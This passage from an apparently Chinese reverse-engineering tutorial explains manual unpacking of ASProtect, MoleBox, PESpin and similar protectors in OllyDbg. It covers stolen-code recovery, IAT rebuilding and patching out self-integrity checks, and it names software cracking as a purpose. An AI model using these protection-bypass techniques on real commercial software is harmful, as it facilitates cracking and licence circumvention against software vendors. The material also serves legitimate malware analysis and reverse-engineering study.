FF 15 45 </span><br><span class="line">FE 41 00 89 0D B1 FD 41 00 FF 35 B1 FD 41 00 8F 05 B5 FC 41 00 FF 35 B5 FC 41 00 56 BE FD FC 41 </span><br><span class="line">00 89 3E 5E FF 35 FD FC 41 00 68 94 00 00 00 8F 05 E5 FC 41 00 FF 35 E5 FC 41 00 5F 89 3D 3D FE </span><br><span class="line">41 00 FF 35 3D FE 41 00 8B 0C 24 8F 05 7D FE 41 00 8B 3C 24 8F 05 79 FD 41 00 89 35 25 FC 41 00 </span><br><span class="line">FF 35 25 FC 41 00 89 0C 24 8B 3C 24 8F 05 B9 FC 41 00 8F 05 19 FE 41 00 89 05 89 FD 41 00 FF 35 </span><br><span class="line">89 FD 41 00 57 BF 19 FE 41 00 8B C7 5F 8B 08 8F 05 95 FC 41 00 8B 05 95 FC 41 00 53 8F 05 5D FE </span><br><span class="line">41 00 FF 35 5D FE 41 00 89 0C 24 89 3D 91 FE 41 00 FF 35 91 FE 41 00 8F 05 81 FC 41 00 89 1D 89 </span><br><span class="line">FE 41 00 FF 35 89 FE 41 00 68 81 FC 41 00 5B 8B 0B 8F 05 C9 FC 41 00 8B 1D C9 FC 41 00 57 89 04 </span><br><span class="line">24 89 0C 24 8B 04 24 8F 05 D5 FD 41 00 8B 0C 24 8F 05 4D FC 41 00 50 89 14 24 8F 05 BD FE 41 00 </span><br><span class="line">FF 35 BD FE 41 00 51 B9 DD FD 41 00 89 39 59 FF 35 DD FD 41 00 C7 05 A9 FE 41 00 60 55 40 00 FF </span><br><span class="line">35 A9 FE 41 00 8B 3C 24 8F 05 95 FD 41 00 89 1D 29 FD 41 00 FF 35 29 FD 41 00 8B DF 8B D3 5B 8F </span><br><span class="line">05 E9 FE 41 00 8B 3D E9 FE 41 00 52 89 1C 24 68 9D FE 41 00 5B 89 13 8B 1C 24 8F 05 49 FE 41 00 </span><br><span class="line">8B 14 24 8F 05 69 FD 41 00 FF 15 9D FE 41 00 89 65 E8 89 25 C5 FD 41 00 89 1D 21 FD 41 00 FF 35 </span><br><span class="line">21 FD 41 00 68 C5 FD 41 00 5B 8B 33 8B 1C 24 8F 05 A9 FC 41 00 89 3E 57 8F 05 F5 FE 41 00 FF 35 </span><br><span class="line">F5 FE 41 00 89 34 24 FF 15 BC A0 40 00 8B 4E 10 50 B8 F9 FB 41 00 89 10 58 FF 35 F9 FB 41 00 56 </span><br><span class="line">C7 04 24 AC DE 40 00 8B 14 24 8F 05 AD FD 41 00 89 0A 8F 05 29 FE 41 00 FF 35 29 FE 41 00 5A 8B </span><br><span class="line">46 04 A3 B8 DE 40 00 8B 56 08 52 8F 05 3D FD 41 00 FF 35 3D FD 41 00 8F 05 BC DE 40 00 8B 76 0C </span><br><span class="line">81 E6 FF 7F 00 00 53 BB 35 FE 41 00 89 33 5B FF 35 35 FE 41 00 8F 05 B0 DE 40 00</span><br></pre></td></tr></table></figure><p>用topo工具在脱壳修复后的程序申请一个新的区段，数以上字节数或直接输入1000，记下起始的地址：0043E000。OD打开脱完壳后的程序，找到0043E000，粘贴入代码，记住，后面得加跳向假OEP的代码！！保存。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JMP 0040305C </span><br></pre></td></tr></table></figure><p>用LoadPE修正入口点为3E000。</p><h3 id="4-12-7-AC脱壳出现的问题"><a href="#4-12-7-AC脱壳出现的问题" class="headerlink" title="4.12.7 AC脱壳出现的问题"></a>4.12.7 AC脱壳出现的问题</h3><ol><li><strong>用LoadPE无法抓取进程内存</strong>。用Scylla填入OEP，获取输入表，不用管无效函数，转储到文件。再用importREC或Scylla重建IAT。</li><li><strong>用importREC填入OEP无法获取输入表</strong>。用Scylla重建IAT，但剪切指针时可能麻烦一点。</li></ol><h2 id="4-13-ASProtect"><a href="#4-13-ASProtect" class="headerlink" title="4.13 ASProtect"></a>4.13 ASProtect</h2><h3 id="4-13-1-ASProtect-1-2"><a href="#4-13-1-ASProtect-1-2" class="headerlink" title="4.13.1 ASProtect 1.2"></a>4.13.1 ASProtect 1.2</h3><p>选项-&gt;调试设置-&gt;异常，将所有异常取消勾选。用最后一次异常法，Shift+F9运行19次。在<code>retn</code>处F2-&gt;Shift+F9-&gt;F2。去到<code>M</code>模块，在401000处下断运行，直接去到OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0040A41E    55              push ebp</span><br><span class="line">0040A41F    8BEC            mov ebp,esp</span><br><span class="line">0040A421    6A FF           push -0x1</span><br><span class="line">0040A423    68 C8CB4000     push 跑跑赛道.0040CBC8</span><br><span class="line">0040A428    68 A4A54000     push 跑跑赛道.0040A5A4</span><br></pre></td></tr></table></figure><h3 id="4-13-2-ASProtect-1-23-RC1"><a href="#4-13-2-ASProtect-1-23-RC1" class="headerlink" title="4.13.2 ASProtect 1.23 RC1"></a>4.13.2 ASProtect 1.23 RC1</h3><p>取消勾选“非法内存访问”，最后一次异常法。Shift+F9运行16次。用4.13.1的方法找到OEP。</p><p>也可以用另一种方法。运行到<code>retn</code>后，查看堆栈窗口的<code>400000</code>下的第二行的数值<code>12FFA4</code>。在命令窗口下硬件断点<code>hr 12FFA4</code>，运行，F8经过一个大跳转也可去到OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0012FF5C   00A0381C</span><br><span class="line">0012FF60   00400000  跑跑排行.00400000</span><br><span class="line">0012FF64   3D375BA5</span><br><span class="line">0012FF68   0012FFA4</span><br></pre></td></tr></table></figure><p>脱壳正常运行。</p><p>也可以用asprdbgr脱壳辅助工具打开加壳程序，让它自动修复IAT，打开importREC发现只有3个无效指针了，直接剪切掉。同样可以运行。</p><h3 id="4-13-3-ASProtect-1-23-RC4"><a href="#4-13-3-ASProtect-1-23-RC4" class="headerlink" title="4.13.3 ASProtect 1.23 RC4"></a>4.13.3 ASProtect 1.23 RC4</h3><p>判断ASProtect版本：</p><ol><li>ASProtect 1.23 RC4 按shift+f9键26次后来到典型异常，在最近处的retn处设断，跳过异常，f8步跟就会来到fake oep。</li></ol><ol><li><p>ASProtect 1.31 04.27 按shift+f9键36次后来到典型异常，在最近处的retn处设断，跳过异常，f8步跟就会来到foep。</p></li><li><p>ASProtect 1.31 05.18 按shift+f9键40次后来到典型异常，在最近处的retn处设断，跳过异常，f8步跟就会来到foep。</p></li><li><p>ASProtect 1.31 06.14 按shift+f9键38次后来到典型异常，在最近处的retn处设断，跳过异常，f8步跟就会来到foep。</p></li></ol><p>用最后一次异常法可能判断不准确，也可以用PEID的VerA插件区分版本。</p><img src="/posts/e2d652c5/ASProtect123rc4.jpg" class="" title="ASProtect123rc4"><p>[1]表示上述第一个版本RC4。</p><p>取消勾选“非法访问内存”，Shift+F9运行26次，在<code>retn</code>处F2-&gt;Shift+F9-&gt;F2。去到<code>M</code>模块，在401000处下断运行，直接去到FOEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">004F27CF    FF15 9CC25200   call dword ptr ds:[0x52C29C]</span><br><span class="line">004F27D5    33D2            xor edx,edx                              ; ntdll.KiFastSystemCallRet</span><br><span class="line">004F27D7    8AD4            mov dl,ah</span><br><span class="line">004F27D9    8915 34306900   mov dword ptr ds:[0x693034],edx          ; ntdll.KiFastSystemCallRet</span><br></pre></td></tr></table></figure><p>找回被偷代码，取消勾选“非法访问内存”，Shift+F9运行26次，在<code>retn</code>处F2-&gt;Shift+F9-&gt;F2。查看堆栈窗口的<code>400000</code>往下数第二行数值为<code>12FFA4</code>，在命令窗口输入<code>hr 12FFA4</code>下硬件断点，运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0012FF5C   00C86804</span><br><span class="line">0012FF60   00400000  SoWorker.00400000</span><br><span class="line">0012FF64   E3DE7228</span><br><span class="line">0012FF68   0012FFA4</span><br></pre></td></tr></table></figure><p>一路F8跟到以下，call跟进去。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00C8544B    BD 5154C800     mov ebp,0xC85451</span><br><span class="line">00C85450    FF55 03         call dword ptr ss:[ebp+0x3]</span><br></pre></td></tr></table></figure><p>发现类似于OEP开头：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00C8547A    55              push ebp</span><br><span class="line">00C8547B    8BEC            mov ebp,esp</span><br><span class="line">00C8547D    6A FF           push -0x1</span><br><span class="line">00C8547F    68 78E35300     push 0x53E378</span><br><span class="line">00C85484    68 407B4F00     push 0x4F7B40</span><br><span class="line">00C85489    64:A1 00000000  mov eax,dword ptr fs:[0]</span><br><span class="line">00C8548F   /EB 01           jmp short 00C85492</span><br></pre></td></tr></table></figure><p>将jmp以上(不包含jmp)的代码二进制复制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">55 8B EC 6A FF 68 78 E3 53 00 68 40 7B 4F 00 64 A1 00 00 00 00</span><br></pre></td></tr></table></figure><p>执行jmp到以下代码，再复制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00C85492    50              push eax</span><br><span class="line">00C85493    64:8925 0000000&gt;mov dword ptr fs:[0],esp</span><br><span class="line">00C8549A    83EC 58         sub esp,0x58</span><br><span class="line">00C8549D    EB 01           jmp short 00C854A0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">50 64 89 25 00 00 00 00 83 EC 58</span><br></pre></td></tr></table></figure><p>以此类推</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00C854A0    53              push ebx</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">53</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00C854A4    56              push esi</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">56</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00C854A8    57              push edi                                 ; SoWorker.006CF040</span><br><span class="line">00C854A9    8965 E8         mov dword ptr ss:[ebp-0x18],esp</span><br><span class="line">00C854AC    26:eb 01        jmp short 00c854b0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">57 89 65 E8</span><br></pre></td></tr></table></figure><p>汇总一下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">55 8B EC 6A FF 68 78 E3 53 00 68 40 7B 4F 00 64 A1 00 00 00 00 50 64 89 25 00 00 00 00 83 EC 58 53 56 57 89 65 E8</span><br></pre></td></tr></table></figure><p>一路F7到这里，再一路F8去到<code>retn</code>，返回父函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00C85378    51              push ecx</span><br><span class="line">00C85379    57              push edi                                 ; SoWorker.006CF040</span><br><span class="line">00C8537A    9C              pushfd</span><br><span class="line">00C8537B    FC              cld</span><br><span class="line">00C8537C    BF B953C800     mov edi,0xC853B9</span><br><span class="line">00C85381    B9 5E140000     mov ecx,0x145E</span><br><span class="line">00C85386    F3:AA           rep stos byte ptr es:[edi]</span><br><span class="line">00C85388    9D              popfd</span><br><span class="line">00C85389    5F              pop edi                                  ; SoWorker.004F27CF</span><br><span class="line">00C8538A    59              pop ecx                                  ; SoWorker.004F27CF</span><br><span class="line">00C8538B    C3              retn</span><br></pre></td></tr></table></figure><p>直接来到FOEP，上面全为0是因为真正的OEP被移到了别处，刚才所做的操作就是把OEP拼接起来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">004F27C9    0000            add byte ptr ds:[eax],al</span><br><span class="line">004F27CB    0000            add byte ptr ds:[eax],al</span><br><span class="line">004F27CD    0000            add byte ptr ds:[eax],al</span><br><span class="line">004F27CF    FF15 9CC25200   call dword ptr ds:[0x52C29C]</span><br></pre></td></tr></table></figure><p>将刚才复制的代码粘贴在它的上方。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">004F27A9    55              push ebp</span><br><span class="line">004F27AA    8BEC            mov ebp,esp</span><br><span class="line">004F27AC    6A FF           push -0x1</span><br><span class="line">004F27AE    68 78E35300     push SoWorker.0053E378</span><br><span class="line">004F27B3    68 407B4F00     push SoWorker.004F7B40</span><br><span class="line">004F27B8    64:A1 00000000  mov eax,dword ptr fs:[0]</span><br><span class="line">004F27BE    50              push eax</span><br><span class="line">004F27BF    64:8925 0000000&gt;mov dword ptr fs:[0],esp</span><br><span class="line">004F27C6    83EC 58         sub esp,0x58</span><br><span class="line">004F27C9    53              push ebx</span><br><span class="line">004F27CA    56              push esi</span><br><span class="line">004F27CB    57              push edi                                 ; SoWorker.006CF040</span><br><span class="line">004F27CC    8965 E8         mov dword ptr ss:[ebp-0x18],esp</span><br><span class="line">004F27CF    FF15 9CC25200   call dword ptr ds:[0x52C29C]</span><br></pre></td></tr></table></figure><p>设置EIP指向第一条指令。脱壳。</p><h3 id="4-13-4-以壳解壳"><a href="#4-13-4-以壳解壳" class="headerlink" title="4.13.4 以壳解壳"></a>4.13.4 以壳解壳</h3><p>Stolen Code太多，可以用以壳解壳的方法。以壳解壳就是将Stolen Code及Stolen Code所在区段的壳一并放在主程序里。这样会导致比无壳程序多了很多无用代码，文件大小比无壳程序大很多。</p><p>与4.13.3操作几乎一致。由于它有ASLR，所以地址与4.13.3会有所不同。FOEP为<code>4F27CF</code>，OEP为<code>C871DE</code>。</p><p>打开LoadPE，修正镜像大小，先完整转存一个，再区域转存OEP所在的区段。在PE编辑器打开脱壳程序，区段-&gt;选中最后一个区段右键-&gt;从磁盘载入区段，将我们刚才保存的区段载入，右键-&gt;编辑区段，程序基址为400000，所在区段起始地址为C80000，所以虚拟地址应为C80000-400000=880000。保存-&gt;确定。</p><p>选项-&gt;重建-&gt;只选“使PE有效”。重建PE-&gt;载入脱壳程序。</p><p>用importREC修复IAT，OEP先填写FOEP，修复好指针后再修改OEP为真正的OEP。程序正常运行。</p><h1 id="5-疑难杂症"><a href="#5-疑难杂症" class="headerlink" title="5. 疑难杂症"></a>5. 疑难杂症</h1><h2 id="5-1-附加数据的处理方法"><a href="#5-1-附加数据的处理方法" class="headerlink" title="5.1 附加数据的处理方法"></a>5.1 附加数据的处理方法</h2><img src="/posts/e2d652c5/%E9%99%84%E5%8A%A0%E6%95%B0%E6%8D%AE.png" class="" title="附加数据"><p>PEID查壳是NSPacK壳，后面写着[overlay]，也就是这个程序有附加数据。</p><p>overlay真正的意思是取消打开功能，将这些需要读取的数据放到pe文件的后面，让程序自动运行打开的功能。比如mp3文件需要播放器打开，那mp3文件除了音乐数据还需要附加数据，让播放器读到能通过播放器运行。</p><p>如果单纯用NSPacK脱壳方法还不足够，会发现脱壳后的程序运行不了。正确方法是将加壳程序后面的附加数据粘贴到脱壳程序的后面。</p><p>用PEID查看区段信息，重点关注最后一个区段的R偏移和R大小。</p><img src="/posts/e2d652c5/%E9%99%84%E5%8A%A0%E6%95%B0%E6%8D%AE%E8%8A%82%E6%9F%A5%E7%9C%8B%E5%99%A8.jpg" class="" title="附加数据节查看器"><p>8800h+400h=8C00h</p><p>用Win HEX打开加壳程序，Alt+G搜索偏移<code>8C00</code>，选第一个字节右键-&gt;选块开始，选文件最后一个字节右键-&gt;选块结束，右键-&gt;编辑-&gt;复制选块-&gt;正常。打开脱壳后的程序，选中最后一个字节，右键-&gt;编辑-&gt;剪贴板数据-&gt;粘贴，保存。程序正常运行。</p><h2 id="5-2-自校验的去除方法"><a href="#5-2-自校验的去除方法" class="headerlink" title="5.2 自校验的去除方法"></a>5.2 自校验的去除方法</h2><p>用了以上各种方法修复程序都运行不了，可以考虑可能是程序有自校验。</p><p>自校验原理：程序会检查自己有没有被修改，如果发现被修改的话，便会离开或进行其它动作。基本的校检方法包括checksum，检查大小，检查跳转代码，等等。</p><p> 将脱壳后的程序也用OD载入，在两个OD的命令窗口下断点<code>bp CreateFileA</code>回车，Alt+F9执行到用户代码，取消断点。接下来对比两个程序执行的不同之处，主要看条件跳转指令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0040120C   /75 07           jnz short 例子.00401215</span><br><span class="line">0040120E   |B8 01000000     mov eax,0x1</span><br><span class="line">00401213   |EB 02           jmp short 例子.00401217</span><br><span class="line">00401215   \33C0            xor eax,eax</span><br></pre></td></tr></table></figure><p>加壳程序这个跳转不实现，而脱壳程序的这个跳转实现了。只要将脱壳程序的跳转指令修改即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jnz short 例子.00401215=&gt;jz short 例子.00401215</span><br></pre></td></tr></table></figure><p>保存后程序正常运行。</p><h1 id="6-脱壳后的简单应用"><a href="#6-脱壳后的简单应用" class="headerlink" title="6. 脱壳后的简单应用"></a>6. 脱壳后的简单应用</h1><p>程序的破解、汉化、美化都要先脱壳才能进行。</p><h2 id="6-1-软件汉化及DIY"><a href="#6-1-软件汉化及DIY" class="headerlink" title="6.1 软件汉化及DIY"></a>6.1 软件汉化及DIY</h2><h3 id="6-1-1-VB类"><a href="#6-1-1-VB类" class="headerlink" title="6.1.1 VB类"></a>6.1.1 VB类</h3><p>VB程序最好用GetVBRes工具。</p><h3 id="6-1-2-VC-VS类"><a href="#6-1-2-VC-VS类" class="headerlink" title="6.1.2 VC++/VS类"></a>6.1.2 VC++/VS类</h3><p>VC++/VS程序可以用Resource Hacker、PEexplorer、xnresource工具。</p><p>脱完壳后加载进Resource Hacker，还是显示“有非标准资源”错误提示，说明我们手工脱壳没脱干净，可能在重建IAT时大小设置为1000，导致有很多垃圾指针。可以用fixres修复一下脱壳后的程序。</p><h3 id="6-1-3-BC-类-Delphi"><a href="#6-1-3-BC-类-Delphi" class="headerlink" title="6.1.3 BC++类/Delphi"></a>6.1.3 BC++类/Delphi</h3><p>BC++/Delphi类最好用PEexplorer工具。</p><h1 id="7-脱壳练习"><a href="#7-脱壳练习" class="headerlink" title="7. 脱壳练习"></a>7. 脱壳练习</h1><h2 id="7-1-kkrunchy-0-23"><a href="#7-1-kkrunchy-0-23" class="headerlink" title="7.1 kkrunchy 0.23"></a>7.1 kkrunchy 0.23</h2><p>单步到<code>push</code>后用ESP定律，继续F8往下，看到一个大跳转，却没有实现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">003FFD5B   /0F84 9F190000   je UnPackMe.00401700</span><br></pre></td></tr></table></figure><p>选中右键-&gt;跟随，是一大片空代码。右键-&gt;断点-&gt;硬件执行-&gt;F9，原本空代码的地方已经出现了OEP，删除硬件断点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00401700    55              push ebp                                 ; UnPackMe.003F2A08</span><br><span class="line">00401701    8BEC            mov ebp,esp</span><br><span class="line">00401703    6A FF           push -0x1</span><br><span class="line">00401705    68 00254000     push UnPackMe.00402500</span><br><span class="line">0040170A    68 86184000     push UnPackMe.00401886</span><br></pre></td></tr></table></figure><p>用单步跟踪、内存镜像法都是要在大跳转那里同样操作才可到达OEP。</p><p>脱壳。注意它的基址是<code>3F0000</code>，所以OEP的偏移地址为<code>11700</code>。</p><h2 id="7-2-AT4RE-Protector"><a href="#7-2-AT4RE-Protector" class="headerlink" title="7.2 AT4RE Protector"></a>7.2 AT4RE Protector</h2><p>PEID显示yoda’s Protector v1.02</p><p>载入OD用2次内存镜像法，在<code>.rsrc</code>资源段设置内存访问断点(A)，设置访问中断(F2)断不下来，因为会去到DLL领空，记得要取消内存断点。再在PE文件头下一行下访问中断，运行，到达以下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00407101    8A1C06          mov bl,byte ptr ds:[esi+eax]</span><br><span class="line">00407104    80EB FF         sub bl,0xFF</span><br><span class="line">00407107    881C06          mov byte ptr ds:[esi+eax],bl</span><br><span class="line">0040710A    46              inc esi</span><br><span class="line">0040710B    83FE 32         cmp esi,0x32</span><br><span class="line">0040710E  ^ 75 F1           jnz short UnPackMe.00407101</span><br><span class="line">00407110  - FFE0            jmp eax                                  ; UnPackMe.00401700</span><br></pre></td></tr></table></figure><p>单步跟到<code>jmp eax</code>去到OEP。</p><h2 id="7-3-ORiEN-v2-11-2-12"><a href="#7-3-ORiEN-v2-11-2-12" class="headerlink" title="7.3 ORiEN v2.11 - 2.12"></a>7.3 ORiEN v2.11 - 2.12</h2><p>开始用ESP定律，再单步几下就到了OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004A1AF1  - FFE0            jmp eax                                  ; UnPackMe.0045159C</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0045159C    55              push ebp</span><br><span class="line">0045159D    8BEC            mov ebp,esp</span><br><span class="line">0045159F    83C4 F0         add esp,-0x10</span><br><span class="line">004515A2    B8 BC134500     mov eax,UnPackMe.004513BC                ; UNICODE &quot;;&quot;</span><br></pre></td></tr></table></figure><p>修复时直接删除无效指针，剪切指针程序会出错。</p><h2 id="7-4-MoleBox-V2-6-5"><a href="#7-4-MoleBox-V2-6-5" class="headerlink" title="7.4 MoleBox V2.6.5"></a>7.4 MoleBox V2.6.5</h2><p>单步跟，跑飞的函数跟进去，就可跟到OEP。(ESP定律也行)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0045159C    55              push ebp</span><br><span class="line">0045159D    8BEC            mov ebp,esp</span><br><span class="line">0045159F    83C4 F0         add esp,-0x10</span><br><span class="line">004515A2    B8 BC134500     mov eax,UnPackMe.004513BC                ; UNICODE &quot;;&quot;</span><br></pre></td></tr></table></figure><p>脱壳，重建输入表时，有很多无效函数，用跟踪1全部修复。</p><img src="/posts/e2d652c5/MoleBox.jpg" class="" title="MoleBox"><p>PEID显示无壳，但是程序不能运行。重新操作一次回到无效函数那里，看其中一个无效函数的RVA<code>55170</code>，在OD命令窗口输入<code>d 455170</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00455170  00477189  UnPackMe.00477189</span><br></pre></td></tr></table></figure><p>发现它是程序函数，而不是系统函数，重建表中应该全是系统函数才对。猜测它是被壳加密了。</p><p>在OD重载一下程序，再次<code>d 455170</code>，这时这个地址什么都没有。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00455170  965AB0EB</span><br></pre></td></tr></table></figure><p>右键-&gt;断点-&gt;硬件访问。Shift+F9直至这个地址出现系统函数。此时处于未加密状态。而这个函数与跟踪1修复函数的名字完全不一样，所以跟踪修复不一定正确。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00455170  7C801D53  kernel32.LoadLibraryExA</span><br></pre></td></tr></table></figure><p>现在单步跟踪观察是哪一步让它变成程序函数。执行完下面这一步时，函数改变。也就是说这一步导致IAT重建时RVA为<code>55170</code>地址的函数无效。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00471682    8901            mov dword ptr ds:[ecx],eax               ; UnPackMe.00477189</span><br></pre></td></tr></table></figure><p>为了不让它改变，往上找能绕过这个指令的跳转指令，这个跳转指令称为magic jump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">00471658   /74 45           je short UnPackMe.0047169F</span><br><span class="line">0047165A   |8D55 F0         lea edx,dword ptr ss:[ebp-0x10]</span><br><span class="line">0047165D   |52              push edx                                 ; UnPackMe.0047D378</span><br><span class="line">0047165E   |6A 04           push 0x4</span><br><span class="line">00471660   |6A 04           push 0x4</span><br><span class="line">00471662   |8B45 08         mov eax,dword ptr ss:[ebp+0x8]           ; UnPackMe.00455170</span><br><span class="line">00471665   |50              push eax                                 ; UnPackMe.00477189</span><br><span class="line">00471666   |FF15 40D84700   call dword ptr ds:[0x47D840]             ; kernel32.VirtualProtect</span><br><span class="line">0047166C   |85C0            test eax,eax                             ; UnPackMe.00477189</span><br><span class="line">0047166E   |75 0A           jnz short UnPackMe.0047167A</span><br><span class="line">00471670   |B9 0B0000EF     mov ecx,0xEF00000B</span><br><span class="line">00471675   |E8 9D2F0000     call UnPackMe.00474617</span><br><span class="line">0047167A   |8B4D 08         mov ecx,dword ptr ss:[ebp+0x8]           ; UnPackMe.00455170</span><br><span class="line">0047167D   |8B55 F8         mov edx,dword ptr ss:[ebp-0x8]           ; UnPackMe.0047D378</span><br><span class="line">00471680   |8B02            mov eax,dword ptr ds:[edx]               ; UnPackMe.00477189</span><br><span class="line">00471682   |8901            mov dword ptr ds:[ecx],eax               ; UnPackMe.00477189</span><br><span class="line">00471684   |8D4D F4         lea ecx,dword ptr ss:[ebp-0xC]</span><br><span class="line">00471687   |51              push ecx                                 ; UnPackMe.00455170</span><br><span class="line">00471688   |8B55 F0         mov edx,dword ptr ss:[ebp-0x10]</span><br><span class="line">0047168B   |52              push edx                                 ; UnPackMe.0047D378</span><br><span class="line">0047168C   |6A 04           push 0x4</span><br><span class="line">0047168E   |8B45 08         mov eax,dword ptr ss:[ebp+0x8]           ; UnPackMe.00455170</span><br><span class="line">00471691   |50              push eax                                 ; UnPackMe.00477189</span><br><span class="line">00471692   |FF15 40D84700   call dword ptr ds:[0x47D840]             ; kernel32.VirtualProtect</span><br><span class="line">00471698   |C745 FC 0100000&gt;mov dword ptr ss:[ebp-0x4],0x1</span><br><span class="line">0047169F   \8B45 FC         mov eax,dword ptr ss:[ebp-0x4]</span><br></pre></td></tr></table></figure><p>重载，同样操作走一次，将je指令修改为jmp指令。Ctrl+G去到OEP，下断点运行，发现信息窗口的这个地址还是系统函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00455170  7C801D53  kernel32.LoadLibraryExA</span><br></pre></td></tr></table></figure><p>重建IAT时已经所有函数都有效了。脱壳，正常运行。</p><h2 id="7-5-PESpin-1-32-Stolen-Code"><a href="#7-5-PESpin-1-32-Stolen-Code" class="headerlink" title="7.5 PESpin 1.32(Stolen Code)"></a>7.5 PESpin 1.32(Stolen Code)</h2><p>ESP定律，Shift+F9运行。单步跟踪发现破碎OEP。</p><figure class="highlight 